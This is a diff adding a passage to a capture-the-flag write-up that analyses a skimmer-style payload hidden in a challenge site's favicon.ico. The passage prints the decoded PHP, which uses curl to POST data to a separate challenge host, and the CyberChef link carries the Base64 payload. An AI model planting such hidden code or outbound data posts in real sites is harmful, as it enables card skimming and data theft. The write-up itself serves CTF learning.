@@ -41,7 +41,22 @@ Here's the paragraph of interest reproduced from the [article](https://www.darkr
 Looks like I should take a closer look at the _favicon_ and other images downloaded for display on the _checkout.php_ page.
 ___
 
+I downloaded the _favicon.ico_ file from http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719/favicon.ico and found that it indeed contained (Javascript) code:
 
+![image](https://user-images.githubusercontent.com/82754379/139862931-6d0d6e38-167a-4396-aff5-33f38a0bad54.png)
+
+There's a Base64-encoded portion, which I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=SkdOb1BXTjFjbXhmYVc1cGRDZ3BPMk4xY214ZmMyVjBiM0IwS0NSamFDeERWVkpNVDFCVVgxVlNUQ3dpYUhSMGNEb3ZMM013Y0hFMmMyeG1ZWFZ1ZDJKMGJYbHpaell5ZVhwdGIyUmtZWGMzY0hCcUxtTjBaaTV6WnpveE9Ea3lOaTk0WTNac2IzTjRaMkowWm1OdlptOTJlWGRpZUdSaGQzSmxaMnBpZW5GMFlTNXdhSEFpS1R0amRYSnNYM05sZEc5d2RDZ2tZMmdzUTFWU1RFOVFWRjlRVDFOVUxERXBPMk4xY214ZmMyVjBiM0IwS0NSamFDeERWVkpNVDFCVVgxQlBVMVJHU1VWTVJGTXNJakUwWXpSaU1EWmlPREkwWldNMU9UTXlNemt6TmpJMU1UZG1OVE00WWpJNVBVaHBKVEl3Wm5KdmJTVXlNSE5qWVdSaElpazdKSE5sY25abGNsOXZkWFJ3ZFhROVkzVnliRjlsZUdWaktDUmphQ2s3) to decode:
+
+![Screenshot from 2021-11-02 22-11-49](https://user-images.githubusercontent.com/82754379/139863889-85bcb128-5de8-43d3-94a9-221995914161.png)
+
+<br>
+
+```javascript
+$ch=curl_init();
+curl_setopt($ch,CURLOPT_URL,"http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php");
+curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,"14c4b06b824ec593239362517f538b29=Hi%20from%20scada");
+$server_output=curl_exec($ch);
+```
 
 
 
